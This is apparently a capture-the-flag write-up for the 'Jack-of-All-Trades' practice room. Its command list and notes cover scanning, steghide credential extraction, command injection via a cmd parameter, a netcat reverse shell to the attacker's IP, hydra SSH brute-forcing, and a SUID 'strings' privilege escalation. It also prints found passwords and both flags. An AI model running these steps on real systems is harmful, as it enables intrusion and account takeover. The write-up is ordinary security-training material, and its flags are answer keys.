# Jack-of-All-Trades - Easy

```shell
sudo vim /etc/hosts
#add joat.thm

nmap -T4 -p- -A -Pn -v joat.thm

feroxbuster -u http://joat.thm:22 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,403,404,405,500

steghide info header.jpg
#use found password

steghide info stego.jpg
#use found password

steghide info jackinthebox.jpg
#requires other password

steghide extract -sf header.jpg

steghide extract -sf stego.jpg

cat creds.txt
#this does not contain creds

cat cms.creds
#this contains creds for jackinthebox

#log into /recovery.php
#and get command execution

nc -nvlp 4444
#run reverse shell command
#we get reverse shell

python -c 'import pty;pty.spawn("/bin/bash")'

#check common directories
ls -la /opt

ls -la /var/www

ls -la /home
#this contains a list

cat /home/jacks_password_list
#copy contents for ssh bruteforce

vim jackslist.txt
#paste passwords

hydra -l jack -P jackslist.txt joat.thm -s 80 ssh
#this gives us a valid password

ssh jack@joat.thm -p 80

ls -la
#contains user.jpg instead of user.txt

#in attacker machine
scp -P 80 jack@joat.thm:/home/jack/user.jpg /home/sv

#view user.jpg to get user flag

python3 -m http.server

#in jack ssh
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#strings binary has SUID bit set
#get exploit from GTFObins

LFILE=/root/root.txt

/usr/bin/strings "$LFILE"
#gives root flag
```

* Open ports & services:

  * 22 - http - Apache httpd 2.4.10 (Debian)
  * 80 - ssh - OpenSSH 6.7p1

* Here, the ```http``` and ```ssh``` ports seem to be reversed.

* We can check the webpage on port 22, but our Firefox browser does not allow us; so we will have to modify the config settings first.

* The webpage can be accessed after the changes - it contains info about 'jack'.

* The webpage also includes some images - we can check if these images contain any clues using ```steganography``` tools.

* Looking at the source code of the webpage, it mentions two things - /recovery.php, and a base64-encoded string.

* We can decode the string and it gives us a name 'Johny Graves' and a password "u?WtKSraq"; we can maybe use this later.

* Using ```steghide```, we can see that all three images contain embedded data.

* With the password found earlier, we are able to get 'cms.creds' from 'header.jpg', and 'creds.txt' from 'stego.jpg'.

* One of these creds files gives us the creds "jackinthebox:TplFxiSHjY".

* We can login using these creds into /recovery.php

* Now, this page says "GET me a 'cmd' and I'll run it for you Future-Jack".

* This is a clue for using the ```cmd``` parameter to run a command.

* So, we can simply use '/index.php?cmd=id' to execute the ```id``` command.

* Now, we can get reverse shell by setting up listener and executing a reverse shell one-liner:

```nc -c sh 10.14.31.212 4444```

* Enumerating common directories such as /opt and /var/www, in /home directory we can see a password list for 'jack'.

* We can copy the contents of the list, and paste it to our machine, where we can attempt SSH bruteforce for 'jack'.

* For bruteforcing, we can use ```hydra``` and attack SSH on port 80.

* This gives us a valid password, and we can now login as jack via SSH.

* In home directory, instead of user flag, we have user.jpg - we can transfer this using ```scp``` and conduct stego analysis again.

* After transferring the .jpg, we can simply view the file to get the user flag.

* We can do privesc enumeration using ```linpeas.sh```.

* This shows that the ```strings``` binary has SUID bit set.

* We can get the exploit from GTFObins for this, and this way we can read the root flag.

```markdown
1. User Flag - securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}

2. Root Flag - securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```
